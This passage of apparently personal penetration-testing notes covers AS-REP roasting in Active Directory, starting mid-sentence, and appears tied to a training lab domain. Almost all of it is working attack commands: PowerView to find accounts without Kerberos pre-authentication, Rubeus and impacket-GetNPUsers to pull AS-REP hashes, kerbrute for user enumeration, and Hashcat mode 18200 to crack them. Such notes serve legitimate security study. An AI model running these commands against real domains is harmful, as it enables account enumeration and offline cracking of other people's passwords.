
possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled

Checking if vulnerable
```powershell-session
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

retrieving as-rep
```powershell-session
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```
get the as-rep hash and then crack the hash with [[Hashcat]] -m 18200

or kerbrute does this userenum and as-rep all together
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

```shell-session
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
